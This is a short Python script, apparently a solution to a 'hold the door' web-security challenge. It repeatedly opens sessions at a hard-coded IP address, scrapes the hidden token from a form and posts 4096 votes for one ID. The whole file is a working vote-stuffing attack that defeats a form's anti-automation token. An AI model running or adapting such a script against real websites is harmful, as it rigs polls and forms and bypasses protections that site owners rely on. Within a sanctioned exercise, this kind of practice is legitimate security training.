#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup

website = "http://158.69.76.135/level1.php"
preference = {'id':'1149', 'holdthedoor': 'Submit', 'key': '0'}

if __name__ == "__main__":
    for i in range(1, 4097):
        period = requests.session()
        webpage = period.get(website)
        BS4 = BeautifulSoup(webpage.text, "html.parser")
        ConcealedV = BS4.find("form", {"method": "post"})
        ConcealedV = ConcealedV.find("input", {"type":"hidden"})
        preference["key"] = ConcealedV["value"]
        period.post(website, data=preference)
